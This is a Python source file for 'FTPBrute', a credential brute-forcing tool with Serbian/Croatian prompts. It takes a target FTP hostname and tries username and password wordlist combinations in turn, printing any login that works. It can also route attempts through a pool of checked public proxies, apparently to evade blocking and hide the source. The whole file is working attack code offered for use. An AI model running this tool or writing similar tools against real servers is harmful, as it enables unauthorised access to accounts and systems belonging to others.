import sys
import chilkat
from concurrent.futures import ThreadPoolExecutor
import os
import requests
from time import sleep
from colorama import Fore
import pyfiglet

class Main():
    rb = 1
    proxybr = 0
    def __init__(self):
        ascii_banner = pyfiglet.figlet_format("FTPBrute")
        print(ascii_banner)             
        self.ftp = chilkat.CkFtp2()
        hostname = input("unesi hostname bez http ili https: ")
        self.ftp.put_Hostname(hostname)
        self.proxylist = []

        print("USERNAME: ")
        print("\n")
        os.chdir("username")
        os.system("dir /b")
        os.chdir("..")
        print("\n")
        print("PASSWORD:")
        print("\n")
        os.chdir("password")
        os.system("dir /b")
        os.chdir("..")
        print("\n")
        
        username = input("Unesi username ili username.txt: ")
        password = input("Unesi password ili password.txt: ")

        self.proxy = input("proxy? da-ne: ")
        if self.proxy == "da":
            os.chdir("..")
            os.system("start /wait cmd /k python checkproxy.py")
            os.chdir("ftp")
            print("\npravim proxy hierarhiju, sacekaj... :")
            with open("../proxylist.txt", "r") as file:
                lines = file.readlines()
                with ThreadPoolExecutor(40) as exe:
                    for line in lines:
                        exe.submit(self.proxyhierarchy, line.strip())
        else:
            pass
        
        
        if (".txt" in username or ".wordlist" in username) and (".txt" in password or ".wordlist" in password):
            userfile = open("username/"+username, "r").readlines()
            passfile = open("password/"+password, "r").readlines()
            for user in userfile:
                for passw in passfile:
                    output = self.user1pass1(user.strip(),passw.strip())
                    if output == "Logged!":
                        self.ftp.Disconnect()
                        exit()
            print("nije pronadjen username i password")
            
        
        
        elif (".txt" in username or ".wordlist" in username) and (".txt" not in password or ".wordlist" not in password):
            userfile = open("username/"+username, "r").readlines()
            for user in userfile:
                output = self.user1pass0(user.strip(), password)
                if output == "Logged!":
                    self.ftp.Disconnect()
                    exit()
            print("nije pronadjen username i password")

        elif (".txt" not in username or ".wordlist" not in username) and (".txt" in password or ".wordlist" in password):
            passfile = open("password/"+password, "r").readlines()
            for passw in passfile:
                output = self.user1pass0(username, passw.strip())
                if output == "Logged!":
                    self.ftp.Disconnect()
                    exit()
            print("nije pronadjen username i password")

        elif (".txt" not in username or ".wordlist" not in username) and (".txt" not in password or ".wordlist" not in password):
            output = self.user1pass0(username, password)
            if output == "Logged!":
                self.ftp.Disconnect()
                exit()
            print("nije pronadjen username i password")



    def user1pass1(self, user, passw):
        self.ftp.put_Username(user.strip())
        self.ftp.put_Password(passw.strip())
        self.ftp.put_Passive(True)
        success = self.ftp.Connect()
        if self.proxy == "da":
            proxyhost = self.proxylist[Main.proxybr]
            proxy = proxyhost.split(sep=":")
            self.ftp.put_HttpProxyHostname(proxy[0])
            self.ftp.put_HttpProxyPort(int(proxy[1]))
        if (success != True):
            print(user + " : " + passw)
            if "Failed to connect to HTTP proxy server." in str(self.ftp.lastErrorText()):
                print("Proxy ne radi!")
                Main.proxybr += 1
                print("mijenjam u proxy: " + self.proxylist[Main.proxybr])
        elif (success == True):
            print(Fore.GREEN+"pronasao username : " + user)
            print(Fore.GREEN+"pronasao password : " + passw)
            print(Fore.WHITE+"Logged in!")
            return "Logged!"
        
    def user1pass0(self,user,passw):
        self.ftp.put_Username(user.strip())
        self.ftp.put_Password(passw.strip())
        self.ftp.put_Passive(True)
        success = self.ftp.Connect()
        if self.proxy == "da":
            proxyhost = self.proxylist[Main.proxybr]
            proxy = proxyhost.split(sep=":")
            self.ftp.put_HttpProxyHostname(proxy[0])
            self.ftp.put_HttpProxyPort(int(proxy[1]))
        if (success != True):
            print(user + " : " + passw)
            if "Failed to connect to HTTP proxy server." in str(self.ftp.lastErrorText()):
                print("Proxy ne radi!")
                Main.proxybr += 1
                print("mijenjam u proxy: " + self.proxylist[Main.proxybr])
        elif (success == True):
            print(Fore.GREEN+"pronasao username : " + user)
            print(Fore.GREEN+"pronasao password : " + passw)
            print(Fore.WHITE+"Logged in!")
            return "Logged!"

    def user0pass1(self, user, passw):
        self.ftp.put_Username(user.strip())
        self.ftp.put_Password(passw.strip())
        self.ftp.put_Passive(True)
        success = self.ftp.Connect()
        if self.proxy == "da":
            proxyhost = self.proxylist[Main.proxybr]
            proxy = proxyhost.split(sep=":")
            self.ftp.put_HttpProxyHostname(proxy[0])
            self.ftp.put_HttpProxyPort(int(proxy[1]))
        if (success != True):
            print(user + " : " + passw)
            if "Failed to connect to HTTP proxy server." in str(self.ftp.lastErrorText()):
                print("Proxy ne radi!")
                Main.proxybr += 1
                print("mijenjam u proxy: " + self.proxylist[Main.proxybr])
        elif (success == True):
            print(Fore.GREEN+"pronasao username : " + user)
            print(Fore.GREEN+"pronasao password : " + passw)
            print(Fore.WHITE+"Logged in!")
            return "Logged!"

    def user0pass0(self, user, passw):
        self.ftp.put_Username(user.strip())
        self.ftp.put_Password(passw.strip())
        self.ftp.put_Passive(True)
        success = self.ftp.Connect()
        if self.proxy == "da":
            proxyhost = self.proxylist[Main.proxybr]
            proxy = proxyhost.split(sep=":")
            self.ftp.put_HttpProxyHostname(proxy[0])
            self.ftp.put_HttpProxyPort(int(proxy[1]))
        if (success != True):
            print(user + " : " + passw)
            if "Failed to connect to HTTP proxy server." in str(self.ftp.lastErrorText()):
                print("Proxy ne radi!")
                Main.proxybr += 1
                print("mijenjam u proxy: " + self.proxylist[Main.proxybr])
        elif (success == True):
            print(Fore.GREEN+"pronasao username : " + user)
            print(Fore.GREEN+"pronasao password : " + passw)
            print(Fore.WHITE+"Logged in!")
            return "Logged!"


    def proxyhierarchy(self, line):
        proxy = {
            "https":""
        }
        proxy["https"] = "http://"+line
        try:
            r = requests.get("https://google.com", proxies=proxy, headers={"content-type": "text"}, timeout=20)
            self.proxylist.append(line.strip())
            print(str(Main.rb) + ". " + line)
            Main.rb += 1
        except:
            pass
if __name__ == "__main__":
    Main()